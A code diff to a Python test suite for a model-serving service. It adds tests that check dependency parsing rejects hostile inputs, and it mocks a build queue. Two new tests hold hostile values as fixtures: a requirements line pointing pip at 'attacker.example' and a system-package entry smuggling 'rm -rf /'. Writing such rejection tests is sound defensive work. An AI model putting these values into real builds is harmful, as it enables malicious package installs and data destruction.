@@ -348,9 +348,28 @@ def test_malformed_pyproject_is_rejected(tmp_path: Path):
         parse_dependencies(tmp_path)
 
 
-def test_changed_dependencies_repoint_affected_services(test_client, test_db, test_settings):
-    from triton_serve.api.models.domain import refresh_service_images
+def test_unparseable_requirement_is_rejected_at_upload(tmp_path: Path):
+    """Rejecting it here is what keeps a bad bundle from being committed and failing at service create."""
+    (tmp_path / "requirements.txt").write_text("--extra-index-url http://attacker.example\n")
+    with pytest.raises(AssertionError, match="requirement"):
+        parse_dependencies(tmp_path)
+
+
+def test_invalid_system_package_is_rejected_at_upload(tmp_path: Path):
+    (tmp_path / "pyproject.toml").write_text(
+        '[project]\nname = "b"\nversion = "0.1.0"\n[tool.serve]\nsystem-packages = ["libgl1; rm -rf /"]\n'
+    )
+    with pytest.raises(AssertionError, match="apt package"):
+        parse_dependencies(tmp_path)
+
+
+def test_changed_dependencies_repoint_affected_services(test_client, test_db, test_settings, monkeypatch):
+    from triton_serve.api.models import domain
     from triton_serve.database.model import Model, Service
+
+    # the build is recorded rather than queued: a real one would push an image no test cleans up
+    enqueued: list[str] = []
+    monkeypatch.setattr(domain, "enqueue_build", enqueued.append)
 
     response = test_client.post(
         "/services",
@@ -371,13 +390,14 @@ def test_changed_dependencies_repoint_affected_services(test_client, test_db, te
 
         model.dependencies = ["numpy==1.26.0"]
         test_db.commit()
-        refresh_service_images(db=test_db, models=[model], settings=test_settings)
+        domain.refresh_service_images(db=test_db, models=[model], settings=test_settings)
 
         test_db.expire_all()
         service = test_db.get(Service, ident=service_id)
         assert service.image_hash != before
         assert service.image.managed
         assert "numpy==1.26.0" in service.image.pip_packages
+        assert enqueued == [service.image_hash]
     finally:
         model.dependencies = original
         test_db.commit()
